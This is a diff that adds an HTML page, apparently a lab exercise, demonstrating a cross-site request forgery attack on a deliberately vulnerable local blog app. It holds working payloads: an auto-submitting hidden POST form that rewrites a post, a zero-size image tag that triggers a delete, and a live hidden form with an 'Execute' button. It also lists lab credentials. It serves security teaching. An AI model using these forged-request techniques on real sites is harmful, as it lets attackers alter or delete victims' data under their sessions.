@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Demo - Shifat's Attack Page</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; padding: 40px; }
+        .container { max-width: 800px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px; }
+        h1 { color: #e94560; }
+        h2 { color: #0f3460; border-bottom: 2px solid #e94560; padding-bottom: 10px; }
+        .payload { background: #0f3460; padding: 15px; border-radius: 6px; margin: 15px 0; overflow-x: auto; }
+        code { color: #00d9ff; font-family: 'Courier New', monospace; }
+        .warning { background: #e94560; color: #fff; padding: 15px; border-radius: 6px; margin: 20px 0; }
+        .btn { display: inline-block; padding: 10px 20px; background: #e94560; color: #fff; text-decoration: none; border-radius: 6px; margin-top: 10px; }
+        .btn:hover { background: #c13651; }
+        .hidden-form { opacity: 0; position: absolute; top: 0; left: 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF Attack Lab - Shifat's Malicious Page</h1>
+
+        <div class="warning">
+            <strong>⚠️ LAB SCENARIO:</strong> User "shifat" (password: 1234) cannot directly edit victim's posts due to authorization checks. 
+            However, because the application has NO CSRF tokens, shifat can force a logged-in victim to unknowingly edit posts!
+        </div>
+
+        <h2>📋 Attack Scenario</h2>
+        <p><strong>Attacker:</strong> shifat (cannot edit victim's posts directly)</p>
+        <p><strong>Victim:</strong> admin or victim user (must be logged in)</p>
+        <p><strong>Goal:</strong> Force victim to edit a post they own, changing content to shifat's malicious text</p>
+
+        <h2>🛠️ Method 1: Hidden Auto-Submit Form</h2>
+        <p>This form auto-submits when the victim visits this page while logged in:</p>
+        <div class="payload">
+<code>&lt;form id="csrf-form" action="http://localhost/SQLMAP_Lab/edit.php?id=1" method="POST"&gt;
+    &lt;input type="hidden" name="title" value="HACKED BY SHIFAT"&gt;
+    &lt;input type="hidden" name="content" value="This post was modified via CSRF attack!"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;</code>
+        </div>
+
+        <!-- ACTUAL HIDDEN FORM FOR DEMO -->
+        <form id="csrf-form" action="http://localhost/SQLMAP_Lab/edit.php?id=1" method="POST" class="hidden-form">
+            <input type="hidden" name="title" value="HACKED BY SHIFAT - CSRF SUCCESS!">
+            <input type="hidden" name="content" value="This post was modified via CSRF attack! Shifat bypassed the authorization check by forcing the victim (post owner) to submit this edit form unknowingly.">
+        </form>
+
+        <h2>🛠️ Method 2: Image Tag GET Request (for delete.php)</h2>
+        <p>For actions that use GET (like delete.php), an image tag can trigger the action:</p>
+        <div class="payload">
+<code>&lt;img src="http://localhost/SQLMAP_Lab/delete.php?id=1" width="0" height="0"&gt;</code>
+        </div>
+
+        <h2>🚀 Execute the Attack</h2>
+        <p><strong>Steps:</strong></p>
+        <ol>
+            <li>Login as <strong>victim</strong> or <strong>admin</strong> in one browser tab</li>
+            <li>Come back to this page and click the button below</li>
+            <li>The form will auto-submit using the VICTIM's session!</li>
+            <li>Check the blog - the post will be modified!</li>
+        </ol>
+
+        <a href="#" class="btn" onclick="document.getElementById('csrf-form').submit(); return false;">🔥 Execute CSRF Attack</a>
+
+        <div style="margin-top: 30px; padding: 15px; background: #533483; border-radius: 6px;">
+            <strong>💡 Why this works:</strong> The browser automatically sends the victim's session cookie with the request. 
+            The server sees a valid logged-in user and processes the edit. There is NO CSRF token to verify the request actually came from the legitimate form!
+        </div>
+    </div>
+</body>
+</html>
